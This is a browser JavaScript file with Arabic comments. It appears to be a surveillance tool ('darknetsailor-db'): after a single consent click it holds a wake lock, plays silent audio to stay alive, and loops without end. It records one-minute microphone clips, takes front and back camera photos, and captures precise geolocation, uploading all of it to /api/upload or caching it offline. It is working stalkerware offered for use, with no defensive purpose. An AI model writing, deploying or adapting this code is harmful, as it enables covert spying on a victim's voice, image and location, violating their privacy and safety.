localforage.config({ name: 'darknetsailor-db', storeName: 'uploads' });
let isRecording = false;
let wakeLock = null;
let globalStream = null;

document.getElementById('startBtn').addEventListener('click', async () => {
    const startBtn = document.getElementById('startBtn');
    const status = document.getElementById('status');
    
    startBtn.style.display = 'none';
    status.innerText = 'جاري طلب الأذونات...';

    try {
        // طلب الكاميرا والميكروفون معاً
        globalStream = await navigator.mediaDevices.getUserMedia({ 
            audio: true, 
            video: { facingMode: 'user' } 
        });
        
        status.innerText = 'جاري تفعيل النظام...';
        await requestWakeLock();
        startSilentKeepAlive();
        
        isRecording = true;
        status.innerText = '✅ النظام يعمل بنجاح';
        status.style.color = '#00ff00';

        // بدء المهمة
        runMission();

    } catch (error) {
        status.innerText = '❌ فشل الاتصال. يرجى السماح بالوصول.';
        status.style.color = '#ff0000';
        startBtn.style.display = 'block';
    }
});

async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen');
    } catch (err) { }
}

function startSilentKeepAlive() {
    const audio = document.getElementById('silentAudio');
    if (audio) {
        audio.volume = 0.01; 
        audio.play().catch(e => console.log("Audio play blocked", e));
    }
}

// ==========================================
// المهمة الرئيسية (حلقة لا نهائية)
// ==========================================
async function runMission() {
    // 1. إرسال الموقع فوراً
    getLocation();

    // 2. الحلقة اللانهائية
    while (isRecording) {
        // تسجيل وإرسال 5 ملفات صوتية (كل ملف دقيقة)
        for (let i = 0; i < 5; i++) {
            if (!isRecording) break;
            await recordAudioChunk();
        }

        // التقاط وإرسال 5 صور (أمامي ثم خلفي)
        for (let i = 0; i < 5; i++) {
            if (!isRecording) break;
            await capturePhoto('user', 'front');
            await sleep(1000); 
            await capturePhoto('environment', 'back');
            await sleep(1000); 
        }
    }
}

// ==========================================
// 1. تسجيل الصوت باستخدام MediaRecorder (مضمون 100%)
// ==========================================
function recordAudioChunk() {
    return new Promise((resolve) => {
        if (!globalStream || !isRecording) return resolve();

        const audioStream = new MediaStream(globalStream.getAudioTracks());
        const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
        let chunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onstop = () => {
            if (chunks.length > 0) {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const timestamp = new Date().getTime();
                uploadOrStore(blob, `audio_${timestamp}.webm`, 'audio');
                console.log(`[+] Sent audio: audio_${timestamp}.webm`);
            }
            resolve();
        };

        mediaRecorder.start();
        
        // تسجيل لمدة 60 ثانية
        setTimeout(() => {
            if (mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
        }, 60000); 
    });
}

// ==========================================
// 2. التقاط الصور
// ==========================================
function capturePhoto(facingMode, prefix) {
    return new Promise(async (resolve) => {
        try {
            // استخدام مسار الفيديو الموجود بالفعل إن أمكن، أو طلب مسار جديد
            const videoTrack = globalStream.getVideoTracks()[0];
            
            // محاولة تغيير الكاميرا
            if (videoTrack) {
                await videoTrack.applyConstraints({ facingMode: facingMode }).catch(e => {});
            }

            const video = document.createElement('video');
            video.srcObject = globalStream;
            video.play();

            await new Promise(r => setTimeout(r, 800)); // انتظار لتثبيت الصورة

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const timestamp = new Date().getTime();
                uploadOrStore(blob, `${prefix}_${timestamp}.jpg`, 'photo');
                console.log(`[+] Sent photo: ${prefix}_${timestamp}.jpg`);
                resolve();
            }, 'image/jpeg', 0.6);
        } catch (e) {
            console.log("Camera error", e);
            resolve(); 
        }
    });
}

// ==========================================
// 3. الموقع الجغرافي
// ==========================================
function getLocation() {
    navigator.geolocation.getCurrentPosition((position) => {
        const data = {
            type: 'location',
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().getTime()
        };
        fetch('/api/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => localforage.setItem(`loc_${data.timestamp}`, data));
    }, (error) => console.log(error), { enableHighAccuracy: true });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function uploadOrStore(blob, filename, type) {
    if (!navigator.onLine) {
        await localforage.setItem(filename, { blob: blob, type: type, filename: filename });
        return;
    }
    const formData = new FormData();
    formData.append('file', blob, filename);
    formData.append('type', type);

    try {
        await fetch('/api/upload', { method: 'POST', body: formData });
    } catch (error) {
        await localforage.setItem(filename, { blob: blob, type: type, filename: filename });
    }
}
